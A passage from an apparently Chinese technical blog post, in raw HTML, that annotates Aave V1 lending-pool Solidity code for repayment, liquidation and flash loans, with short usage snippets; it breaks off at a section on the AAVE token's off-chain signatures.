更新还款信息</span><br><span class="line">    core.updateStateOnRepay(</span><br><span class="line">        _reserve,</span><br><span class="line">        _onBehalfOf,</span><br><span class="line">        vars.paybackAmountMinusFees,</span><br><span class="line">        vars.originationFee,</span><br><span class="line">        vars.borrowBalanceIncrease,</span><br><span class="line">        vars.compoundedBorrowBalance == vars.paybackAmountMinusFees</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    //if the user didn&#x27;t repay the origination fee, transfer the fee to the fee collection address</span><br><span class="line">    // 还手续费</span><br><span class="line">    if(vars.originationFee &gt; 0) &#123;</span><br><span class="line">        core.transferToFeeCollectionAddress.value(vars.isETH ? vars.originationFee : 0)(</span><br><span class="line">            _reserve,</span><br><span class="line">            msg.sender,</span><br><span class="line">            vars.originationFee,</span><br><span class="line">            addressesProvider.getTokenDistributor()</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 还款</span><br><span class="line">    core.transferToReserve.value(vars.isETH ? msg.value.sub(vars.originationFee) : 0)(</span><br><span class="line">        _reserve,</span><br><span class="line">        msg.sender,</span><br><span class="line">        vars.paybackAmountMinusFees</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    emit Repay(</span><br><span class="line">        _reserve,</span><br><span class="line">        _onBehalfOf,</span><br><span class="line">        msg.sender,</span><br><span class="line">        vars.paybackAmountMinusFees,</span><br><span class="line">        vars.originationFee,</span><br><span class="line">        vars.borrowBalanceIncrease,</span><br><span class="line">        //solium-disable-next-line</span><br><span class="line">        block.timestamp</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import &quot;openzeppelin-solidity/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">// 接口</span><br><span class="line">LendingPoolAddressesProvider provider = LendingPoolAddressesProvider(address(0x24a42fD28C976A61Df5D00D0599C34c4f90748c8)); </span><br><span class="line">LendingPool lendingPool = LendingPool(provider.getLendingPool());</span><br><span class="line"></span><br><span class="line">// 还DAI</span><br><span class="line">address daiAddress = address(0x6B175474E89094C44Da98b954EedeAC495271d0F);</span><br><span class="line">uint256 amount = 1000 * 1e18;</span><br><span class="line"></span><br><span class="line">// 如果是自己还款</span><br><span class="line">lendingPool.repay(daiAddress, amount, msg.sender);</span><br><span class="line"></span><br><span class="line">// 如果是帮别人还款</span><br><span class="line">address userAddress = /*users_address*/;</span><br><span class="line">IERC20(daiAddress).approve(provider.getLendingPoolCore(), amount); // Approve LendingPool contract</span><br><span class="line">lendingPool.repay(daiAddres, amount, userAddress);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="清算"><a href="#清算" class="headerlink" title="清算"></a>清算</h3><ul><li>清算条件：当健康因子小于1的时候，可以进行清算。可以用<code>getUserAccountData()</code>查看健康因子</li><li>清算过程：可以清算部分资产，也可以清算全部，并且获得打了折扣的抵押品作为回报（相当于清算奖励）。清算人可以指定获取aToken或者标的资产作为清算奖励。清算完之后，健康因子会回到1以上</li><li>清算比例：清算人最多清算待偿还金额的 50%，清算折扣就是按照该金额计算的</li><li>清算前准备：清算人必须approve给AAVE _collateral ，否则无法清算</li><li>注意事项<ul><li>在大多数情况下，清算人会选择尽可能多的清算（接近50%），将_purchaseAmount设置为-1表示AAVE最大允许的清算比例</li><li>如果是用ETH清算，要保证msg.value=_purchaseAmount</li></ul></li></ul><p>清算接口如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function liquidationCall(</span><br><span class="line">        address _collateral, // 借款人质押了啥标的资产</span><br><span class="line">        address _reserve, // 借款人借了啥标的资产</span><br><span class="line">        address _user, // 清算人地址</span><br><span class="line">        uint256 _purchaseAmount, // 清算人帮忙偿还的金额，偿还给AAVE</span><br><span class="line">        bool _receiveAToken // true：清算获得aTokens，false：获得标的资产</span><br><span class="line">    ) external payable nonReentrant onlyActiveReserve(_reserve) onlyActiveReserve(_collateral) &#123;</span><br><span class="line">        address liquidationManager = addressesProvider.getLendingPoolLiquidationManager();</span><br><span class="line"></span><br><span class="line">        //solium-disable-next-line</span><br><span class="line">        (bool success, bytes memory result) = liquidationManager.delegatecall(</span><br><span class="line">            abi.encodeWithSignature(</span><br><span class="line">                &quot;liquidationCall(address,address,address,uint256,bool)&quot;,</span><br><span class="line">                _collateral,</span><br><span class="line">                _reserve,</span><br><span class="line">                _user,</span><br><span class="line">                _purchaseAmount,</span><br><span class="line">                _receiveAToken</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        require(success, &quot;Liquidation call failed&quot;);</span><br><span class="line"></span><br><span class="line">        (uint256 returnCode, string memory returnMessage) = abi.decode(result, (uint256, string));</span><br><span class="line"></span><br><span class="line">        if (returnCode != 0) &#123;</span><br><span class="line">            //error found</span><br><span class="line">            revert(string(abi.encodePacked(&quot;Liquidation failed: &quot;, returnMessage)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>实际的清算会跳转LendingPoolLiquidationManager合约执行<code>liquidationCall()</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line">function liquidationCall(</span><br><span class="line">    address _collateral,</span><br><span class="line">    address _reserve,</span><br><span class="line">    address _user,</span><br><span class="line">    uint256 _purchaseAmount,</span><br><span class="line">    bool _receiveAToken</span><br><span class="line">) external payable returns (uint256, string memory) &#123;</span><br><span class="line">    // 防止栈过深</span><br><span class="line">    LiquidationCallLocalVars memory vars;</span><br><span class="line"></span><br><span class="line">    // 获取健康因子</span><br><span class="line">    (, , , , , , , vars.healthFactorBelowThreshold) = dataProvider.calculateUserGlobalData(</span><br><span class="line">        _user</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // 没有达到清算阈值则返回</span><br><span class="line">    if (!vars.healthFactorBelowThreshold) &#123;</span><br><span class="line">        return (</span><br><span class="line">            uint256(LiquidationErrors.HEALTH_FACTOR_ABOVE_THRESHOLD),</span><br><span class="line">            &quot;Health factor is not below the threshold&quot;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 达到了清算阈值，执行下面的逻辑</span><br><span class="line"></span><br><span class="line">    // 查看借款人质押了多少标的资产</span><br><span class="line">    vars.userCollateralBalance = core.getUserUnderlyingAssetBalance(_collateral, _user);</span><br><span class="line"></span><br><span class="line">    // 借款人质押的标的资产不可能是0</span><br><span class="line">    if (vars.userCollateralBalance == 0) &#123;</span><br><span class="line">        return (</span><br><span class="line">            uint256(LiquidationErrors.NO_COLLATERAL_AVAILABLE),</span><br><span class="line">            &quot;Invalid collateral to liquidate&quot;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 用户此标的资产必须设置为可用于清算</span><br><span class="line">    vars.isCollateralEnabled =</span><br><span class="line">        core.isReserveUsageAsCollateralEnabled(_collateral) &amp;&amp;</span><br><span class="line">        core.isUserUseReserveAsCollateralEnabled(_collateral, _user);</span><br><span class="line"></span><br><span class="line">    if (!vars.isCollateralEnabled) &#123;</span><br><span class="line">        return (</span><br><span class="line">            uint256(LiquidationErrors.COLLATERAL_CANNOT_BE_LIQUIDATED),</span><br><span class="line">            &quot;The collateral chosen cannot be liquidated&quot;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 用户必须借了这个标的资产才可用于清算</span><br><span class="line">    (, vars.userCompoundedBorrowBalance, vars.borrowBalanceIncrease) = core</span><br><span class="line">        .getUserBorrowBalances(_reserve, _user);</span><br><span class="line"></span><br><span class="line">    if (vars.userCompoundedBorrowBalance == 0) &#123;</span><br><span class="line">        return (</span><br><span class="line">            uint256(LiquidationErrors.CURRRENCY_NOT_BORROWED),</span><br><span class="line">            &quot;User did not borrow the specified currency&quot;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //all clear - calculate the max principal amount that can be liquidated</span><br><span class="line">    // 计算用户最大可清算的资产数额</span><br><span class="line">    vars.maxPrincipalAmountToLiquidate = vars</span><br><span class="line">        .userCompoundedBorrowBalance</span><br><span class="line">        .mul(LIQUIDATION_CLOSE_FACTOR_PERCENT)</span><br><span class="line">        .div(100);</span><br><span class="line"></span><br><span class="line">    // 计算清算人实际清算的金额</span><br><span class="line">    vars.actualAmountToLiquidate = _purchaseAmount &gt; vars.maxPrincipalAmountToLiquidate</span><br><span class="line">        ? vars.maxPrincipalAmountToLiquidate</span><br><span class="line">        : _purchaseAmount;</span><br><span class="line"></span><br><span class="line">    // 计算实际可清算的金额</span><br><span class="line">    (uint256 maxCollateralToLiquidate, uint256 principalAmountNeeded) = calculateAvailableCollateralToLiquidate(</span><br><span class="line">        _collateral,</span><br><span class="line">        _reserve,</span><br><span class="line">        vars.actualAmountToLiquidate,</span><br><span class="line">        vars.userCollateralBalance</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // 计算手续费</span><br><span class="line">    vars.originationFee = core.getUserOriginationFee(_reserve, _user);</span><br><span class="line"></span><br><span class="line">    // 清算加上手续费</span><br><span class="line">    if (vars.originationFee &gt; 0) &#123;</span><br><span class="line">        (</span><br><span class="line">            vars.liquidatedCollateralForFee,</span><br><span class="line">            vars.feeLiquidated</span><br><span class="line">        ) = calculateAvailableCollateralToLiquidate(</span><br><span class="line">            _collateral,</span><br><span class="line">            _reserve,</span><br><span class="line">            vars.originationFee,</span><br><span class="line">            vars.userCollateralBalance.sub(maxCollateralToLiquidate)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //if principalAmountNeeded &lt; vars.ActualAmountToLiquidate, there isn&#x27;t enough</span><br><span class="line">    //of _collateral to cover the actual amount that is being liquidated, hence we liquidate</span><br><span class="line">    //a smaller amount</span><br><span class="line">    // 如果实际清算金额大于用于借款人清算的资产金额，那么说明不够钱清算，只能清算这一部分</span><br><span class="line">    if (principalAmountNeeded &lt; vars.actualAmountToLiquidate) &#123;</span><br><span class="line">        vars.actualAmountToLiquidate = principalAmountNeeded;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //if liquidator reclaims the underlying asset, we make sure there is enough available collateral in the reserve</span><br><span class="line">    // 清算人想要获取标的资产</span><br><span class="line">    if (!_receiveAToken) &#123;</span><br><span class="line">        // 获取当前可用的质押金额</span><br><span class="line">        uint256 currentAvailableCollateral = core.getReserveAvailableLiquidity(_collateral);</span><br><span class="line">        // 如果借款人没有那么多钱来偿还清算，则报错</span><br><span class="line">        if (currentAvailableCollateral &lt; maxCollateralToLiquidate) &#123;</span><br><span class="line">            return (</span><br><span class="line">                uint256(LiquidationErrors.NOT_ENOUGH_LIQUIDITY),</span><br><span class="line">                &quot;There isn&#x27;t enough liquidity available to liquidate&quot;</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 更新清算信息</span><br><span class="line">    core.updateStateOnLiquidation(</span><br><span class="line">        _reserve,</span><br><span class="line">        _collateral,</span><br><span class="line">        _user,</span><br><span class="line">        vars.actualAmountToLiquidate,</span><br><span class="line">        maxCollateralToLiquidate,</span><br><span class="line">        vars.feeLiquidated,</span><br><span class="line">        vars.liquidatedCollateralForFee,</span><br><span class="line">        vars.borrowBalanceIncrease,</span><br><span class="line">        _receiveAToken</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // 获取aToken地址</span><br><span class="line">    AToken collateralAtoken = AToken(core.getReserveATokenAddress(_collateral));</span><br><span class="line"></span><br><span class="line">    //if liquidator reclaims the aToken, he receives the equivalent atoken amount</span><br><span class="line">    // 如果清算人想要获取aToken</span><br><span class="line">    if (_receiveAToken) &#123;</span><br><span class="line">        collateralAtoken.transferOnLiquidation(_user, msg.sender, maxCollateralToLiquidate);</span><br><span class="line">    &#125; else &#123; // 如果清算人想要获得标的资产</span><br><span class="line">        collateralAtoken.burnOnLiquidation(_user, maxCollateralToLiquidate); // 销毁借款人的aToken</span><br><span class="line">        core.transferToUser(_collateral, msg.sender, maxCollateralToLiquidate); // 转标的资产给清算人</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 清算人帮助借款人还款给AAVE池子</span><br><span class="line">    core.transferToReserve.value(msg.value)(_reserve, msg.sender, vars.actualAmountToLiquidate);</span><br><span class="line"></span><br><span class="line">    if (vars.feeLiquidated &gt; 0) &#123;</span><br><span class="line">        //if there is enough collateral to liquidate the fee, first transfer burn an equivalent amount of</span><br><span class="line">        //aTokens of the user</span><br><span class="line">        // 如果清算完之后，借款人还有足够的金额支付手续费，则扣除用户的aToken</span><br><span class="line">        collateralAtoken.burnOnLiquidation(_user, vars.liquidatedCollateralForFee);</span><br><span class="line"></span><br><span class="line">        // 清算手续费</span><br><span class="line">        core.liquidateFee(</span><br><span class="line">            _collateral,</span><br><span class="line">            vars.liquidatedCollateralForFee,</span><br><span class="line">            addressesProvider.getTokenDistributor()</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        emit OriginationFeeLiquidated(</span><br><span class="line">            _collateral,</span><br><span class="line">            _reserve,</span><br><span class="line">            _user,</span><br><span class="line">            vars.feeLiquidated,</span><br><span class="line">            vars.liquidatedCollateralForFee,</span><br><span class="line">            //solium-disable-next-line</span><br><span class="line">            block.timestamp</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    emit LiquidationCall(</span><br><span class="line">        _collateral,</span><br><span class="line">        _reserve,</span><br><span class="line">        _user,</span><br><span class="line">        vars.actualAmountToLiquidate,</span><br><span class="line">        maxCollateralToLiquidate,</span><br><span class="line">        vars.borrowBalanceIncrease,</span><br><span class="line">        msg.sender,</span><br><span class="line">        _receiveAToken,</span><br><span class="line">        //solium-disable-next-line</span><br><span class="line">        block.timestamp</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    return (uint256(LiquidationErrors.NO_ERROR), &quot;No errors&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import &quot;openzeppelin-solidity/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">// 获取接口</span><br><span class="line">LendingPoolAddressesProvider provider = LendingPoolAddressesProvider(address(0x24a42fD28C976A61Df5D00D0599C34c4f90748c8)); </span><br><span class="line">LendingPool lendingPool = LendingPool(provider.getLendingPool());</span><br><span class="line"></span><br><span class="line">// 借款人的清算资产地址</span><br><span class="line">address collateralAddress = /*collateral_address*/;</span><br><span class="line">// 清算人用DAI来清算</span><br><span class="line">address daiAddress = address(0x6B175474E89094C44Da98b954EedeAC495271d0F); // mainnet DAI</span><br><span class="line">// 借款人地址</span><br><span class="line">address userAddress = /*user_address_being_liquidated*/;</span><br><span class="line">// 偿还金额</span><br><span class="line">uint256 purchaseAmount = 100 * 1e18;</span><br><span class="line">// 获取aToken</span><br><span class="line">bool receiveATokens = true;</span><br><span class="line"></span><br><span class="line">// DAI授权，这样池子才能工作</span><br><span class="line">IERC20(daiAddress).approve(provider.getLendingPoolCore(), purchaseAmount);</span><br><span class="line"></span><br><span class="line">// 清算</span><br><span class="line">lendingPool.liquidationCall(</span><br><span class="line">    collateralAddress,</span><br><span class="line">    daiAddress,</span><br><span class="line">    userAddress,</span><br><span class="line">    purchaseAmount,</span><br><span class="line">    receiveATokens</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="闪电贷"><a href="#闪电贷" class="headerlink" title="闪电贷"></a>闪电贷</h3><ul><li>_receiver：调用闪电贷的合约</li><li>_reserve：借贷多少金额</li><li>_params：回调函数的参数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">function flashLoan(address _receiver, address _reserve, uint256 _amount, bytes memory _params)</span><br><span class="line">    public</span><br><span class="line">    nonReentrant</span><br><span class="line">    onlyActiveReserve(_reserve)</span><br><span class="line">    onlyAmountGreaterThanZero(_amount)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    // 查看AAVE池子是否有足够的钱给你闪电贷</span><br><span class="line">    // 不用getAvailableLiquidity()来查询，因为这个方法太消耗gas了</span><br><span class="line">    uint256 availableLiquidityBefore = _reserve == EthAddressLib.ethAddress()</span><br><span class="line">        ? address(core).balance</span><br><span class="line">        : IERC20(_reserve).balanceOf(address(core));</span><br><span class="line"></span><br><span class="line">    require(</span><br><span class="line">        availableLiquidityBefore &gt;= _amount,</span><br><span class="line">        &quot;There is not enough liquidity available to borrow&quot;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // 闪电贷手续费</span><br><span class="line">    (uint256 totalFeeBips, uint256 protocolFeeBips) = parametersProvider</span><br><span class="line">        .getFlashLoanFeesInBips();</span><br><span class="line">    uint256 amountFee = _amount.mul(totalFeeBips).div(10000);</span><br><span class="line"></span><br><span class="line">    // 借款的金额太小，四舍五入导致手续费为0，则revert，因此闪电贷的金额不能太小</span><br><span class="line">    uint256 protocolFee = amountFee.mul(protocolFeeBips).div(10000);</span><br><span class="line">    require(</span><br><span class="line">        amountFee &gt; 0 &amp;&amp; protocolFee &gt; 0,</span><br><span class="line">        &quot;The requested amount is too small for a flashLoan.&quot;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // 获取到调用闪电贷的合约实例</span><br><span class="line">    IFlashLoanReceiver receiver = IFlashLoanReceiver(_receiver);</span><br><span class="line"></span><br><span class="line">    address payable userPayable = address(uint160(_receiver));</span><br><span class="line"></span><br><span class="line">    // 转钱给调用闪电贷的合约实例</span><br><span class="line">    core.transferToUser(_reserve, userPayable, _amount);</span><br><span class="line"></span><br><span class="line">    // 调用闪电贷的合约实例 调用回调函数。合约需要在回调函数中偿还金额：借款金额+手续费</span><br><span class="line">    receiver.executeOperation(_reserve, _amount, amountFee, _params);</span><br><span class="line"></span><br><span class="line">    // 闪电贷结束之后，查看合约的资产情况</span><br><span class="line">    uint256 availableLiquidityAfter = _reserve == EthAddressLib.ethAddress()</span><br><span class="line">        ? address(core).balance</span><br><span class="line">        : IERC20(_reserve).balanceOf(address(core));</span><br><span class="line"></span><br><span class="line">    // 闪电贷结束之后的合约资产 = 闪电贷结束之前的合约资产 + 手续费</span><br><span class="line">    // V1版本非常不友好，我们必须完全精确的计算，否则交易失败</span><br><span class="line">    // 这里严格等于并不会导致DoS，因为不是用合约的变量记录资产信息，</span><br><span class="line">    // 这个方法是直接获取资产信息的，因此避免了这个问题</span><br><span class="line">    require(</span><br><span class="line">        availableLiquidityAfter == availableLiquidityBefore.add(amountFee),</span><br><span class="line">        &quot;The actual balance of the protocol is inconsistent&quot;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // 更新闪电贷信息</span><br><span class="line">    core.updateStateOnFlashLoan(</span><br><span class="line">        _reserve,</span><br><span class="line">        availableLiquidityBefore,</span><br><span class="line">        amountFee.sub(protocolFee),</span><br><span class="line">        protocolFee</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    //solium-disable-next-line</span><br><span class="line">    emit FlashLoan(_receiver, _reserve, _amount, amountFee, protocolFee, block.timestamp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 合约解接口</span><br><span class="line">LendingPoolAddressesProvider provider = LendingPoolAddressesProvider(address(0x24a42fD28C976A61Df5D00D0599C34c4f90748c8)); </span><br><span class="line">LendingPool lendingPool = LendingPool(provider.getLendingPool());</span><br><span class="line"></span><br><span class="line">// 一个实现了闪电贷回调函数的合约</span><br><span class="line">address receiver = /*contract_address*/;</span><br><span class="line">// 借DAI</span><br><span class="line">address daiAddress = address(0x6B175474E89094C44Da98b954EedeAC495271d0F); // mainnet DAI</span><br><span class="line">uint256 amount = 1000 * 1e18;</span><br><span class="line"></span><br><span class="line">// 回调函数参数</span><br><span class="line">bytes memory params = &quot;&quot;;</span><br><span class="line">// Else encode the params like below (bytes encoded param of type `address` and `uint`)</span><br><span class="line">// bytes memory params = abi.encode(address(this), 1234);</span><br><span class="line"></span><br><span class="line">lendingPool.flashLoan(receiver, daiAddress, amount, params);</span><br></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li>借款利率模式：改变借款的模式，要做一定的检验才可以转换模式</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function swapBorrowRateMode(address _reserve)</span><br></pre></td></tr></table></figure><ul><li>改变稳定模式的利率：市场的流动性比稳定利率还大时，用户想更新自己借款的稳定模式利率</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function rebalanceStableBorrowRate(address _reserve, address _user)</span><br></pre></td></tr></table></figure><h3 id="view方法"><a href="#view方法" class="headerlink" title="view方法"></a>view方法</h3><ul><li><code>getReserveConfigurationData()</code>：查看AAVE池子的基本信息，包括清算阈值、利率、是否启用质押、是否启用可借款等</li><li><code>getReserveData()</code>：返回池子的详细信息，包括总流动性、可用流动性、总借款、流动性比例、稳定模式利率等</li><li><code>getUserAccountData()</code>：查看用户在池子中总资产的情况，包括总质押数量、总可借款数量、健康因子、清算阈值、总抵押数量等，全部用ETH计价</li><li><code>getUserReserveData()</code>：查看用户在池子中某种资产的情况，包括总质押数量、总可借款数量、健康因子、清算阈值、总抵押数量等，全部用ETH计价</li></ul><h2 id="AAVE代币"><a href="#AAVE代币" class="headerlink" title="AAVE代币"></a>AAVE代币</h2><h3 id="链下签名"><a href="#链下签名" class="headerlink" title="链下签名"></a>链下签名</h3><p>链下签名授权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 